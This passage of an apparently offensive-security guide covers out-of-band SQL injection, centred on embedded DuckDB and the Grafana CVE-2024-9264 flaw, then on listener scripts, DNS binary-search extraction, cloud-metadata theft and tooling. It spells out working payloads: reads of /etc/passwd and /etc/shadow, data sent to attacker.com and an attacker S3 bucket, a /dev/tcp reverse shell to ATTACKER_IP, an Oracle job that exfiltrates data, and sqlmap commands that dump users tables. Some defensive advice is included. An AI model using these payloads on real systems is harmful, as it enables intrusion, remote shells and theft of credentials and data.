+DuckDB operates in a fundamentally different model. It is an **embedded, in-process analytical database** -- a C++ library linked directly into the host application binary. When Grafana, dbt, Jupyter, or Metabase uses DuckDB, there is no separate database process. There is no TCP connection between "application" and "database." DuckDB executes inside the application's memory space, sharing the application's process ID, network namespace, file descriptors, environment variables, and cloud credentials. The database IS the application.
+
+This architectural difference has five security consequences that invalidate traditional OOB defenses:
+
+1. **No database port to firewall.** Traditional defense: block outbound connections from the database server IP. With DuckDB, the "database server" is the application server. Blocking outbound connections from the Grafana server blocks Grafana itself.
+
+2. **No database process to monitor.** Traditional defense: alert when the database process (\`sqlservr.exe\`, \`oracle\`, \`postgres\`) makes DNS queries. With DuckDB, all network activity comes from the host process (\`grafana-server\`, \`python3\`, \`node\`). There is no distinct database process to fingerprint.
+
+3. **No DBA to configure access controls.** Traditional defense: revoke EXECUTE on \`xp_dirtree\`, configure Oracle network ACLs, restrict \`pg_execute_server_program\`. With DuckDB, there is no DBA. The developer embedding DuckDB must explicitly set security configurations in code -- and most do not.
+
+4. **No privilege boundary between application and database.** Traditional defense: the database connection uses a low-privilege account without \`sysadmin\` or \`FILE\` rights. With DuckDB, the database executes with the full privileges of the host process. If the application runs as root, DuckDB runs as root. If the application has an IAM role with S3 access, DuckDB inherits that role.
+
+5. **HTTP data access is the primary feature, not an exploitable side effect.** When MSSQL's \`xp_dirtree\` triggers a DNS lookup, that is a side effect of directory listing. When Oracle's \`UTL_HTTP\` makes an HTTP request, that is an integration utility. When DuckDB's \`read_csv_auto('https://...')\` fetches a remote file, **that is the database doing exactly what it was designed to do.** The OOB vector is not a bug in DuckDB. It is DuckDB working as intended.
+
+The analogy to SQLite is instructive but incomplete. SQLite is also embedded and in-process, but SQLite has effectively zero OOB capability -- no HTTP client, no network functions, no cloud storage integration. DuckDB is SQLite's analytical counterpart with one critical addition: **native network access as a core feature.** DuckDB was designed from the ground up to query data wherever it lives -- local files, HTTP endpoints, S3 buckets, GCS objects, Azure Blob Storage. This design choice makes DuckDB the most OOB-capable database engine in existence, while simultaneously being the hardest to defend because it lacks every traditional database security boundary.
+
+#### DuckDB vs Traditional RDBMS OOB: The Comparison
+
+| Dimension | Traditional RDBMS (MSSQL/Oracle/PG) | DuckDB |
+|-----------|--------------------------------------|--------|
+| **Architecture** | Client-server, separate process | Embedded, in-process library |
+| **Network boundary** | Database port (1433/1521/5432) | None -- shares host process |
+| **OOB mechanism** | Utility functions repurposed (xp_dirtree, UTL_HTTP) | Primary features (read_csv_auto, httpfs) |
+| **Privilege for OOB** | Often elevated (sysadmin, DBA, FILE, superuser) | Query execution (default) |
+| **Database firewall** | Exists (Oracle DB Firewall, Azure SQL FW) | Does not exist |
+| **Network ACL** | Configurable (Oracle 12c+ ACLs, PG pg_hba.conf) | None -- inherits host's network stack |
+| **DBA configuration** | Explicit grants required for OOB functions | No DBA; developer must set \`enable_external_access=false\` |
+| **Cloud credential access** | Requires SSRF to metadata service (169.254.169.254) | Direct via credential chain provider (env vars, IAM roles, AWS config) |
+| **File system access** | Limited (LOAD_FILE needs FILE priv, UTL_FILE needs directory) | Full read by default (\`read_csv_auto('/etc/passwd')\` works out of the box) |
+| **Outbound protocol** | Primarily DNS/SMB (UNC), some HTTP | HTTP/HTTPS natively, S3/GCS/Azure Blob, DNS via HTTP resolution |
+| **Monitoring signature** | Database process -> external DNS/HTTP | Indistinguishable from legitimate application HTTP traffic |
+| **Disable OOB** | Revoke specific functions (REVOKE EXECUTE ON xp_dirtree) | Set \`enable_external_access=false\` in code (one setting) |
+
+#### DuckDB's OOB Function Surface
+
+DuckDB ships with a rich set of functions that enable OOB data access. These are divided into core functions (always available) and extension functions (autoloaded or manually loaded):
+
+**Core File Reading Functions (always available, default enabled):**
+
+| Function | Input Sources | Returns | OOB Use |
+|----------|--------------|---------|---------|
+| \`read_csv_auto(source)\` | Local path, HTTP URL, S3 URI | Table | Fetch attacker URL with exfil data in query param |
+| \`read_csv(source, ...)\` | Same | Table | Same, with explicit column config |
+| \`read_json_auto(source)\` | Local path, HTTP URL, S3 URI | Table | JSON data from attacker URL |
+| \`read_parquet(source)\` | Local path, HTTP URL, S3 URI | Table | Parquet from S3 with inherited credentials |
+| \`read_text(source)\` | Local path | Table (content, filename, size) | Read \`/etc/passwd\`, config files |
+| \`read_blob(source)\` | Local path | Table (content as BLOB) | Read binary files, keystores, databases |
+| \`COPY ... TO path\` | Local path, S3 URI | Void (writes file) | Write query results to S3 bucket |
+| \`ATTACH path\` | Local path, HTTP URL, S3 URI | Database | Attach remote DuckDB databases (read-only) |
+| \`getenv('VAR')\` | Environment variable name | VARCHAR | Read AWS keys, API tokens (**CLI only**) |
+
+**httpfs Extension (autoloaded when \`https://\` or \`s3://\` URL is used):**
+
+The \`httpfs\` extension activates automatically -- no explicit \`INSTALL\` or \`LOAD\` needed (autoloading is ON by default). It enables:
+- HTTP/HTTPS read access for all \`read_*\` functions
+- S3 API with full **read AND write** support, including multipart upload
+- GCS access via \`gs://\` or \`gcs://\` URL schemes using HMAC keys
+- Azure Blob Storage support
+- AWS credential chain: environment variables -> AWS config files -> IAM instance profiles -> SSO -> STS assume-role
+
+**Community Extensions (installable, expand OOB surface):**
+
+| Extension | Functions | OOB Capability | Install |
+|-----------|----------|----------------|---------|
+| \`http_request\` | \`http_get()\`, \`http_post()\`, \`http_put()\`, \`http_patch()\`, \`http_delete()\`, \`http_post_form()\`, \`http_post_multipart()\` | **Direct OOB POST exfiltration** -- can POST arbitrary query results to attacker-controlled HTTP endpoints with custom headers. This is the most direct OOB vector. | \`INSTALL http_request FROM community\` |
+| \`shellfs\` | Pipe syntax in \`read_csv('cmd \\|')\` | **Full RCE** -- executes arbitrary OS commands via pipe syntax in file reading functions | \`INSTALL shellfs FROM community\` |
+| \`httpserver\` | Starts HTTP API server | Turns DuckDB into an HTTP server, enables reverse shell patterns | \`INSTALL httpserver FROM community\` |
+
+**Critical note on community extensions:** Community extensions are built and signed by the DuckDB build infrastructure, but the source code comes from third-party developers with **no pre-submission code review by DuckDB**. The \`allow_community_extensions\` setting (default: \`true\`) controls whether they can be loaded.
+
+#### The Columnar Exfiltration Advantage
+
+DuckDB's OLAP architecture provides a bulk data processing capability that traditional row-oriented RDBMS OOB lacks. Traditional OOB extracts data character-by-character (DNS binary search), row-by-row (hex-encoded subdomains), or through slow chunked queries. DuckDB's analytical engine can:
+
+1. **Aggregate entire tables into a single value** using \`string_agg()\` or \`list()\`, then embed the result in a single HTTP request URL parameter
+2. **Write full query results to S3** using \`COPY ... TO 's3://bucket/dump.parquet'\` with columnar Parquet compression -- orders of magnitude faster than DNS-based exfiltration
+3. **Join across local files and remote sources** in a single query -- reading \`/etc/passwd\` and correlating with data from an internal S3 bucket, then exfiltrating the combined result
+4. **Process data locally before exfiltration** using DuckDB's full analytical SQL (window functions, CTEs, aggregations) to extract only the high-value records, reducing exfiltration volume and detection risk
+
+Where MSSQL OOB via \`xp_dirtree\` DNS subdomains extracts ~30 bytes per query (limited by DNS label length), a single DuckDB \`COPY ... TO 's3://...'\` command can exfiltrate gigabytes of data in a Parquet-compressed columnar format. The speed difference is not incremental -- it is categorical.
+
+#### CVE-2024-9264: Grafana SQL Expressions -- Complete Analysis
+
+| Field | Value |
+|-------|-------|
+| **CVE** | CVE-2024-9264 |
+| **Product** | Grafana OSS and Enterprise (observability platform) |
+| **CVSS 3.1** | **9.9 Critical** (Grafana CNA) / 8.8 High (NIST) |
+| **CVSS 4.0** | **9.4 Critical** (Grafana CNA) |
+| **CWE** | CWE-77 (Command Injection), CWE-94 (Code Injection) |
+| **Affected** | 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1 |
+| **Fixed** | 11.0.6+security-01, 11.1.7+security-01, 11.2.2+security-01 |
+| **Access** | Viewer role (lowest authenticated role in Grafana) |
+| **Prerequisite** | DuckDB CLI binary installed on Grafana server and in \`$PATH\` |
+| **Reporter** | Internal Grafana Labs engineer |
+
+**How the Vulnerability Worked:**
+
+Grafana 11.x introduced "SQL Expressions" -- an experimental feature that allowed users to post-process data source query results using SQL. The implementation passed user-supplied SQL expressions to the **DuckDB CLI binary** (\`duckdb\`) as an external process via \`exec.Command\`. The user's SQL was not sanitized against DuckDB-specific functions.
+
+**The attack flow:**
+
+\`\`\`
+Grafana Viewer (lowest auth) 
+  -> POST /api/ds/query?ds_type=__expr__&expression=true
+    -> JSON body: {"type": "sql", "expression": "<MALICIOUS SQL>"}
+      -> Grafana passes expression to DuckDB CLI process
+        -> DuckDB executes with Grafana server's OS privileges
+          -> Arbitrary file read, HTTP OOB exfil, RCE
+\`\`\`
+
+**Exploitation payloads (verified from public PoCs):**
+
+\`\`\`sql
+-- Arbitrary file read (CVE-2024-9264 primary impact)
+SELECT content FROM read_blob('/etc/passwd')
+SELECT * FROM read_csv_auto('/etc/passwd')
+
+-- Environment variable extraction (DuckDB CLI only)
+SELECT getenv('GRAFANA_DATABASE_URL')
+SELECT getenv('AWS_SECRET_ACCESS_KEY')
+SELECT getenv('GF_SECURITY_ADMIN_PASSWORD')
+
+-- OOB exfiltration: file content to attacker via HTTP
+SELECT * FROM read_csv_auto(
+  'http://attacker.com/exfil?data=' || (
+    SELECT string_agg(content, ',') FROM read_text('/etc/passwd')
+  )
+)
+
+-- OOB exfiltration: query results to attacker S3 bucket
+COPY (SELECT * FROM read_csv_auto('/etc/shadow'))
+  TO 's3://attacker-bucket/grafana-shadow.parquet' (FORMAT PARQUET)
+
+-- Direct HTTP POST exfiltration via community extension
+INSTALL http_request FROM community; LOAD http_request;
+SELECT * FROM http_post(
+  'http://attacker.com/exfil',
+  (SELECT content FROM read_blob('/etc/grafana/grafana.ini')),
+  'text/plain'
+)
+
+-- RCE via shellfs community extension
+INSTALL shellfs FROM community; LOAD shellfs;
+SELECT * FROM read_csv('bash -c "sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" |')
+
+-- Cloud credential theft via IMDS (if Grafana runs on EC2/GCE)
+SELECT * FROM read_csv_auto(
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+)
+\`\`\`
+
+**Impact chain**: Viewer account (lowest privilege) -> Grafana SQL Expression -> DuckDB CLI execution -> arbitrary file read (\`/etc/passwd\`, \`/etc/shadow\`, Grafana config, TLS private keys) + HTTP OOB exfiltration + environment variable extraction (database URLs, API keys, cloud credentials) + S3 credential-bearing exfiltration + RCE via \`shellfs\` extension.
+
+**The Patch:**
+
+Grafana **completely removed the SQL Expressions feature** and all DuckDB integration. The feature was not patched -- it was ripped out entirely. It was later re-introduced using \`go-mysql-server\` (Dolthub's in-process Go SQL engine) with a strict **function allowlist** (\`pkg/expr/sql/parser_allow.go\`) that permits only safe operations: aggregations, string functions, date operations, JSON processing, math, and window functions. No filesystem functions, no HTTP functions, no extension loading. The replacement explicitly rejects any function not on the allowlist.
+
+This architectural decision -- replacing an embedded database with full OS access with a sandboxed SQL engine with a function allowlist -- is the correct defense pattern for any application embedding DuckDB or similar embedded databases in user-facing SQL contexts.
+
+#### DuckDB Security Controls (and Their Gaps)
+
+DuckDB provides configuration settings to restrict its capabilities. However, these are **opt-in** -- the default configuration enables everything:
+
+| Setting | Default | Effect When Restrictive |
+|---------|---------|------------------------|
+| \`enable_external_access\` | **true** | When \`false\`: disables ATTACH, COPY, all \`read_*\` functions for external sources. **Primary kill switch.** |
+| \`lock_configuration\` | **false** | When \`true\`: prevents further config changes (immutable security posture). Must be set AFTER other restrictions. |
+| \`allow_community_extensions\` | **true** | When \`false\`: blocks \`shellfs\`, \`http_request\`, \`httpserver\`, and all community-sourced extensions. |
+| \`autoinstall_known_extensions\` | **true** | When \`false\`: prevents automatic extension download on first use. |
+| \`autoload_known_extensions\` | **true** | When \`false\`: requires explicit \`LOAD\` before extension functions work. |
+| \`disabled_filesystems\` | *empty* | Set to \`LocalFileSystem\` to block local file reads while allowing HTTP. |
+| \`allowed_directories\` | *unrestricted* | Fine-grained file path ACLs. |
+| \`allow_unsigned_extensions\` | **false** | When \`true\`: allows loading arbitrary \`.duckdb_extension\` binaries from any path or URL. |
+
+**Known security bypass:** \`sniff_csv()\` was discovered to provide filesystem access even when \`enable_external_access=false\` (GHSA-w2gf-jxc9-pf2q). Pandas/NumPy replacement scans were also not disabled by \`enable_external_access=false\` (GitHub issue #12114). These gaps demonstrate that security settings in embedded databases may have coverage holes that traditional RDBMS access controls (tested over decades) do not.
+
+**The fundamental problem:** Every application that embeds DuckDB must explicitly configure these settings. The DuckDB documentation warns: "DuckDB should be treated like code in Bash or Python -- do not execute SQL from untrusted sources without proper sandboxing." But the default configuration trusts everything. Most developers embedding DuckDB in data tools never configure these settings because DuckDB "just works" out of the box -- with full filesystem and network access enabled.
+
+#### The Modern Data Stack as an OOB Attack Surface
+
+CVE-2024-9264 is not an isolated incident. DuckDB is embedded across the modern data and analytics ecosystem. Every tool on this list runs DuckDB in-process with the host application's permissions. If user-controlled input reaches DuckDB SQL execution without parameterization, the full OOB surface documented above is available.
+
+**dbt (data build tool):**
+dbt-duckdb uses DuckDB as a local development database. dbt compiles Jinja2 templates into SQL and executes them. The injection vector is the dbt **package supply chain** -- a malicious dbt package can override adapter macros to inject arbitrary SQL that executes with DuckDB's full capabilities (file access, httpfs, cloud credentials). A compromised dbt macro running \`SELECT * FROM read_csv_auto('/etc/passwd')\` executes with the data engineer's local permissions, including access to their AWS credentials, SSH keys, and source code. This affects both dbt-core (local) and dbt Cloud (hosted).
+
+**Jupyter Notebooks:**
+DuckDB is a popular in-notebook SQL engine via \`duckdb.sql()\` or the JupySQL \`%%sql\` magic. DuckDB in a notebook runs with the **full privileges of the notebook kernel user** -- often a service account with cloud IAM roles for data lake access. Shared notebooks with parameterized cells that interpolate user input into DuckDB SQL are injection vectors. A single malicious cell in a shared Jupyter environment can exfiltrate the entire cloud credential set.
+
+**BI Tools (Metabase, Superset, Redash):**
+All three support DuckDB connections and custom SQL queries. Metabase's community DuckDB driver connects to local DuckDB files. Superset uses SQLAlchemy with \`duckdb-engine\`. Custom SQL in dashboards -- a feature designed for analyst flexibility -- becomes an OOB injection surface when parameters are user-controllable. The DuckDB engine has no additional sandboxing beyond what the BI tool provides.
+
+**Apache Airflow / Dagster / Prefect:**
+DuckDB operators in DAG definitions process data locally. If DAG parameters derive from untrusted input (API triggers, webhook payloads, user-submitted configurations), DuckDB SQL injection enables OOB exfiltration from the orchestrator's execution environment -- which typically has broad cloud access for pipeline execution.
+
+**Evidence.dev:**
+SQL-based reporting framework that uses DuckDB as its default data source. SQL queries are written directly in Markdown files. If a developer can modify the SQL in Evidence reports (through repo access or a supply chain attack on the report template), they have access to DuckDB's full capability set.
+
+**Streamlit / Gradio:**
+Data applications commonly use \`duckdb.sql()\` or \`connection.execute()\` with user-provided filter values interpolated into SQL strings. Classic SQL injection in a DuckDB context escalates from data disclosure to full file system access and HTTP OOB exfiltration.
+
+**MotherDuck (Cloud DuckDB):**
+Hybrid execution model where queries run partly on the client and partly in the cloud. The local execution portion retains full local file system access. The cloud portion runs in an isolated "Duckling" (dedicated DuckDB instance) with SOC 2 Type II controls. The OOB implications depend on which portion of the query runs where -- a query reading local files executes locally with local privileges, while cloud-side computation is sandboxed.
+
+**DuckDB-WASM (Browser):**
+DuckDB compiled to WebAssembly for browser execution. The browser sandbox **neutralizes all OOB vectors**: no local filesystem access beyond OPFS (Origin Private File System), all HTTP requests go through the browser's fetch API with CORS restrictions, no shell execution, no cloud credential access. DuckDB-WASM is the one deployment context where embedded OOB does not apply.
+
+#### Why This Matters: The Invisible Database Problem
+
+The security industry has spent two decades building defenses against database OOB: network segmentation isolates database servers, egress filtering blocks outbound connections from database hosts, database activity monitoring alerts on calls to dangerous functions, and DBAs revoke privileges from application accounts. These defenses assume the database is a distinct, identifiable, network-visible entity.
+
+DuckDB -- and the broader trend toward embedded analytical databases -- invalidates all of these assumptions. The database is invisible to network monitoring because it shares the application's network identity. The database is invisible to process monitoring because it runs inside the application process. The database is invisible to database activity monitoring because there is no database server to monitor. And the database's "DBA" is a developer who may not even know they are running a database -- they just called \`duckdb.sql()\` to query a CSV file.
+
+This is not a DuckDB-specific problem. It is a category problem. As embedded databases with network capabilities proliferate (DuckDB, Polars with cloud connectors, DataFusion, Velox), the attack surface for OOB SQL injection expands into contexts where traditional SQL injection defenses are not deployed because nobody thinks of these tools as "databases" in the traditional sense. The developer building a Streamlit dashboard does not configure database firewalls. The data engineer writing dbt models does not review Oracle network ACLs. The analyst building a Metabase dashboard does not revoke \`xp_dirtree\` privileges. They are using "analytics tools" -- not "databases." But the OOB capability is identical.
+
+The defense pattern established by Grafana's CVE-2024-9264 patch is the template: replace the embedded database in user-facing SQL contexts with a **sandboxed SQL engine** that has an explicit **function allowlist**. Never expose DuckDB's full SQL surface to user input. If DuckDB must process user-influenced queries, set \`enable_external_access=false\` and \`lock_configuration=true\` before any user SQL executes. Treat DuckDB SQL with the same caution as unsandboxed code execution -- powerful, useful, and catastrophically dangerous if it processes untrusted input.
+
+---
+
+### Custom OOB Listener Setup
+
+#### DNS Listener (Python + dnslib)
+
+\`\`\`python
+#!/usr/bin/env python3
+"""OOB DNS listener -- captures exfiltrated data from SQL injection DNS callbacks.
+Logs all subdomain queries with timestamps. Decodes hex-encoded labels."""
+
+from dnslib.server import DNSServer, BaseResolver
+from dnslib import RR, QTYPE, A
+import sys
+import datetime
+import binascii
+
+class OOBResolver(BaseResolver):
+    def resolve(self, request, handler):
+        qname = str(request.q.qname).rstrip('.')
+        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        labels = qname.split('.')
+        data_labels = '.'.join(labels[:-2])  # strip base domain
+
+        if data_labels:
+            print(f"[{ts}] RAW: {data_labels}  (full: {qname})")
+            # Attempt hex decode
+            try:
+                clean = data_labels.replace('.', '')
+                decoded = binascii.unhexlify(clean).decode('utf-8', errors='replace')
+                print(f"[{ts}] HEX: {decoded}")
+            except (ValueError, binascii.Error):
+                pass
+
+        reply = request.reply()
+        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
+        return reply
+
+if __name__ == '__main__':
+    domain = sys.argv[1] if len(sys.argv) > 1 else "oob.example.com"
+    print(f"[*] OOB DNS listener on UDP/53 for *.{domain}")
+    print(f"[*] Waiting for DNS callbacks...")
+    server = DNSServer(OOBResolver(), port=53, address="0.0.0.0")
+    server.start()
+\`\`\`
+
+**Setup**:
+\`\`\`bash
+pip install dnslib
+sudo python3 oob_dns.py oob.attacker.com
+# Requires: NS record for oob.attacker.com pointing to your server IP
+\`\`\`
+
+#### HTTP Listener (Python stdlib -- zero dependencies)
+
+\`\`\`python
+#!/usr/bin/env python3
+"""OOB HTTP listener -- captures exfiltrated data from HTTP callbacks.
+Logs URL path, query parameters, and POST body as exfiltrated data."""
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import datetime
+import sys
+import urllib.parse
+
+class OOBHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        print(f"[{ts}] GET  Path: {parsed.path}")
+        if params:
+            for k, v in params.items():
+                print(f"[{ts}]      {k} = {v[0]}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"ok")
+
+    def do_POST(self):
+        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length).decode('utf-8', errors='replace')
+        print(f"[{ts}] POST Body: {body}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"ok")
+
+    def log_message(self, *args):
+        pass  # suppress default access log
+
+if __name__ == '__main__':
+    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+    print(f"[*] OOB HTTP listener on :{port}")
+    print(f"[*] Waiting for HTTP callbacks...")
+    HTTPServer(("0.0.0.0", port), OOBHandler).serve_forever()
+\`\`\`
+
+#### DNS Data Reassembly Script
+
+\`\`\`python
+#!/usr/bin/env python3
+"""Reassemble chunked OOB DNS exfiltration data.
+Input: one DNS query per line (from listener output).
+Format: SEQUENCE.HEXDATA.base.domain.com"""
+
+import binascii
+import sys
+
+queries = {}
+for line in sys.stdin:
+    line = line.strip()
+    if not line:
+        continue
+    parts = line.split('.')
+    if len(parts) >= 4:
+        try:
+            seq = int(parts[0])
+            hexdata = parts[1]
+            queries[seq] = hexdata
+        except (ValueError, IndexError):
+            continue
+
+result = b''
+for seq in sorted(queries.keys()):
+    try:
+        result += binascii.unhexlify(queries[seq])
+    except binascii.Error:
+        result += queries[seq].encode()
+
+print(f"Extracted ({len(result)} bytes): {result.decode('utf-8', errors='replace')}")
+\`\`\`
+
+---
+
+### DNS Binary Search
+
+When the injection context only allows triggering an OOB callback (yes/no DNS hit) without embedding data in the subdomain, use binary search on ASCII values:
+
+\`\`\`
+Goal: Extract first character of administrator's password.
+
+Step 1: IF ASCII(SUBSTRING(password,1,1)) > 64 EXEC xp_dirtree '\\\\hit.oob.attacker.com\\x'
+  -> DNS hit = YES, char > '@' (ASCII 64)
+
+Step 2: IF ASCII(SUBSTRING(password,1,1)) > 96
+  -> DNS hit = YES, char > '\`' (lowercase range)
+
+Step 3: IF ASCII(SUBSTRING(password,1,1)) > 112
+  -> No hit = NO, char <= 'p'
+
+Step 4: IF ASCII(SUBSTRING(password,1,1)) > 104
+  -> DNS hit = YES, char > 'h'
+
+Step 5: IF ASCII(SUBSTRING(password,1,1)) > 108
+  -> No hit = NO, char <= 'l'
+
+Step 6: IF ASCII(SUBSTRING(password,1,1)) > 106
+  -> DNS hit = YES, char > 'j'
+
+Step 7: IF ASCII(SUBSTRING(password,1,1)) > 107
+  -> No hit = NO, char is 107 = 'k'
+
+7 queries per character (log2(128) = 7).
+\`\`\`
+
+| Method | Queries per char | Data in subdomain? | Speed | Use when |
+|--------|-----------------|-------------------|-------|----------|
+| Direct hex encoding | 1 per ~30 chars | Yes | Fastest | Can embed data in subdomain |
+| Chunked exfiltration | 1 per chunk | Yes | Fast | Large data, need ordering |
+| Binary search | 7 per char | No (hit/no-hit) | Slow | Can only trigger OOB, cannot embed data |
+| Bit-by-bit | 8 per char | No (hit/no-hit) | Slowest | Extreme filtering, last resort |
+
+### Level 5: Cloud Metadata via OOB, OAST Methodology, Cl0p Playbook Analysis
+
+#### Cloud Metadata via OOB Chain (SSRF)
+
+When the database runs on a cloud instance (AWS EC2, Azure VM, GCP Compute), OOB functions can reach the cloud metadata service:
+
+\`\`\`sql
+-- Oracle: SSRF to AWS metadata via UTL_HTTP
+SELECT UTL_HTTP.REQUEST(
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+) FROM dual
+
+-- MSSQL: SSRF via xp_cmdshell + curl
+EXEC xp_cmdshell 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'
+
+-- DuckDB: SSRF via read_csv_auto
+SELECT * FROM read_csv_auto(
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+)
+\`\`\`
+
+If the instance has an IAM role attached, the metadata service returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token). These credentials provide access to whatever AWS services the role permits -- S3 buckets, Lambda functions, DynamoDB tables, or the entire AWS account.
+
+#### Asynchronous OOB (Fire-and-Forget)
+
+Some injection contexts execute queries asynchronously -- the SQL runs after the HTTP response has already been sent. Boolean and time-based techniques fail completely because there is no response timing to measure. OOB works because the outbound DNS/HTTP request is independent of the response lifecycle:
+
+\`\`\`sql
+-- Oracle: asynchronous job execution with OOB callback
+BEGIN
+  DBMS_SCHEDULER.CREATE_JOB(
+    job_name => 'exfil_job',
+    job_type => 'PLSQL_BLOCK',
+    job_action => q'[BEGIN
+      UTL_HTTP.REQUEST('http://attacker.com/?data=' || (SELECT user FROM dual));
+    END;]',
+    enabled => TRUE
+  );
+END;
+\`\`\`
+
+The query is submitted and the HTTP response returns immediately. Minutes later, the database scheduler executes the job, and the OOB callback arrives at the attacker's server.
+
+#### OAST Methodology (PortSwigger)
+
+PortSwigger coined the term OAST -- Out-of-Band Application Security Testing -- to describe the systematic use of OOB interaction payloads for vulnerability detection. The methodology:
+
+1. **Instrument every input**: Insert unique OOB payloads (Collaborator/interactsh subdomains) into every testable parameter, header, and cookie
+2. **Wait for callbacks**: Monitor the OOB listener for any interactions from the target
+3. **Correlate**: Match each callback to the specific payload/input that triggered it
+4. **Zero false positives**: If the OOB server receives a callback, the vulnerability exists -- there is no ambiguity, no noise, no statistical uncertainty
+
+This is fundamentally different from response-based testing. Boolean blind requires distinguishing between identical-looking responses. Time-based blind must filter network jitter from injected delays. OAST either gets a callback or it does not. PortSwigger's Collaborator Everywhere Burp extension applies this methodology passively to all web traffic.
+
+#### Cl0p Breach Playbook Analysis
+
+The Cl0p ransomware group perfected a repeatable SQLi-to-OOB-exfiltration playbook across two of the largest data breaches in history:
+
+**MOVEit Transfer (CVE-2023-34362, May-June 2023)**:
+1. SQL injection in \`/human.aspx\` endpoint (MSSQL backend)
+2. Deploy LEMURLOOT webshell (\`human2.aspx\`) via SQLi -- filename chosen to blend with legitimate \`human.aspx\`
+3. Webshell serves as persistent OOB exfiltration channel -- browse file systems, download files over HTTPS
+4. Pure data exfiltration -- no ransomware encryption, no lateral movement
+5. Scale: 3,000+ US entities, 8,000+ organizations globally, ~94 million individuals affected
+
+**Accellion FTA (CVE-2021-27101, Dec 2020 - Feb 2021)**:
+1. SQL injection via crafted Host header in \`document_root.html\`
+2. Deploy DEWMODE webshell on compromised FTA servers
+3. Webshell enables file system browsing and file download -- persistent OOB channel
+4. Stolen data published on Cl0p leak site for extortion
+5. Scale: ~100 organizations attacked, ~25 significant data theft (Shell, Kroger, Morgan Stanley, Qualys, Singtel, Reserve Bank of New Zealand)
+
+**The pattern**: Both attacks follow identical operational logic. SQLi provides initial access. A webshell provides persistent OOB exfiltration. The injection point and the exfiltration channel are deliberately separated. The application logs the HTTP request that triggered the injection, but the data theft happens through the webshell -- a different URL, a different code path, a different monitoring blind spot. This separation is the defining characteristic of OOB in an APT context.
+
+---
+
+## Tactics (MITRE ATT&CK Mapping)
+
+| Tactic | Technique ID | Technique Name | OOB Application |
+|--------|-------------|----------------|-----------------|
+| Initial Access | T1190 | Exploit Public-Facing Application | SQL injection in web application |
+| Execution | T1059 | Command and Scripting Interpreter | xp_cmdshell, COPY TO PROGRAM |
+| Persistence | T1505.003 | Web Shell | Stager deploys webshell for persistent access |
+| Credential Access | T1552.001 | Credentials In Files | Extract passwords from database tables |
+| Discovery | T1082 | System Information Discovery | @@version, user, db_name() via OOB |
+| Collection | T1005 | Data from Local System | Bulk table extraction via staged channel |
+| Exfiltration | T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | DNS exfiltration (port 53 UDP) |
+| Exfiltration | T1048.001 | Exfiltration Over Symmetric Encrypted Non-C2 Protocol | HTTPS exfiltration via UTL_HTTP/httpfs |
+| Exfiltration | T1041 | Exfiltration Over C2 Channel | Webshell as C2 for data theft (Cl0p pattern) |
+| Command and Control | T1071.004 | Application Layer Protocol: DNS | DNS subdomain encoding for data transfer |
+
+---
+
+## Tools
+
+### Primary Tools
+
+| Tool | Type | OOB Function | Cost | URL |
+|------|------|-------------|------|-----|
+| **Burp Collaborator** | OOB listener (built into Burp Pro) | DNS/HTTP/HTTPS/SMTP callback monitoring | Commercial (Burp Pro) | https://portswigger.net/burp/documentation/collaborator |
+| **interactsh** | OOB listener (standalone) | DNS/HTTP/HTTPS/SMTP/LDAP/SMB/FTP | Free / Open Source | https://github.com/projectdiscovery/interactsh |
+| **sqlmap** (\`--dns-domain\`) | SQLi automation + DNS exfil | Built-in DNS server for data extraction | Free / Open Source | https://sqlmap.org |
+| **ODAT** | Oracle Database attacking tool | UTL_HTTP, UTL_INADDR, DBMS_LDAP, HTTPURITYPE automation | Free / Open Source | https://github.com/quentinhardy/odat |
+| **Collabfiltrator** | Burp extension | Automates DNS exfil data decoding via Collaborator | Free / Open Source | https://github.com/0xC01DF00D/Collabfiltrator |
+| **PowerUpSQL** | MSSQL auditing framework | UNC path injection, xp_dirtree automation | Free / Open Source | https://github.com/NetSPI/PowerUpSQL |
+
+### Supporting Tools
+
+| Tool | Purpose |
+|------|---------|
+| **Responder** | Capture NTLM hashes from SMB/UNC OOB connections |
+| **tcpdump / tshark** | Raw DNS query monitoring and parsing |
+| **Ghauri** | sqlmap alternative with OOB detection support |
+| **Caido** | Web proxy with OAST integration for OOB testing |
+| **dnslog.cn** | Public DNS callback monitoring service |
+| **webhook.site** | Public HTTP callback monitoring service |
+
+### sqlmap DNS Exfiltration
+
+\`\`\`bash
+# Basic DNS exfiltration (requires you control DNS for the domain)
+sudo sqlmap -u "http://target.com/?id=1" --dns-domain=oob.attacker.com
+
+# Target-specific with full dump
+sudo sqlmap -u "http://target.com/?id=1" \\
+  --dns-domain=oob.attacker.com \\
+  --dbms=mssql \\
+  --dump -T users -C username,password
+
+# sqlmap starts a DNS server on port 53 (needs root/sudo)
+# Injects DNS exfiltration payloads into the blind SQLi
+# Captures data from DNS subdomain queries automatically
+# Decodes and displays results in real-time
+\`\`\`
+
+**Requirements**: You must control the DNS for \`--dns-domain\`. NS records must point to the machine running sqlmap. sqlmap runs a minimal DNS server on port 53, requiring root/sudo.
+
+### interactsh Quick Start
+
+\`\`\`bash
+# Install
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+
+# Generate unique callback domain
+interactsh-client -v
+# Output: [INF] c23b2la0kl1krjcrd8g07h2oyyy.oast.fun
+
+# Use generated domain in SQL payloads:
